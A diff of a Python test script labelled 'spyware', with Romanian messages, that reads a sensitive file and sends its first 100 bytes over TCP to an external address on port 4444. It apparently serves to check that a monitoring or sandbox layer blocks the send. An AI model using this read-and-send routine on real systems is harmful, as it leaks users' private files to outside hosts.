@@ -7,24 +7,27 @@ EXTERNAL_IP = "8.8.8.8"
 EXTERNAL_PORT = 4444            
 
 def main():
-    print(f"[TEST][SPYWARE] PID propriu: {os.getpid()}")
+    pid = os.getpid()
+    print(f"[TEST][SPYWARE] PID propriu: {pid}")
 
-    
     print(f"[TEST][SPYWARE] citesc fisierul sensibil: {SENSITIVE_FILE}")
     with open(SENSITIVE_FILE, "r") as f:
         data = f.read()
     print(f"[TEST][SPYWARE] am citit {len(data)} bytes")
 
-    
     time.sleep(0.5)   
-    print(f"[TEST][SPYWARE] trimit date catre {EXTERNAL_IP}:{EXTERNAL_PORT}")
 
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)   # UDP, nu are nevoie de handshake
+    print(f"[TEST][SPYWARE] incerc conectare catre {EXTERNAL_IP}:{EXTERNAL_PORT}...")
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(2.0)
+
     try:
-        sock.sendto(data[:100].encode(), (EXTERNAL_IP, EXTERNAL_PORT))
-        print("[TEST][SPYWARE] date trimise (UDP, fara raspuns necesar)")
+        sock.connect((EXTERNAL_IP, EXTERNAL_PORT))
+        sock.sendall(data[:100].encode())
+        print("[TEST][SPYWARE] date trimise cu succes!")
     except Exception as e:
-        print(f"[TEST][SPYWARE] eroare la trimitere: {e}")
+        print(f"[TEST][SPYWARE] rezultat conexiune (se asteapta blocare sau timeout): {e}")
     finally:
         sock.close()
 
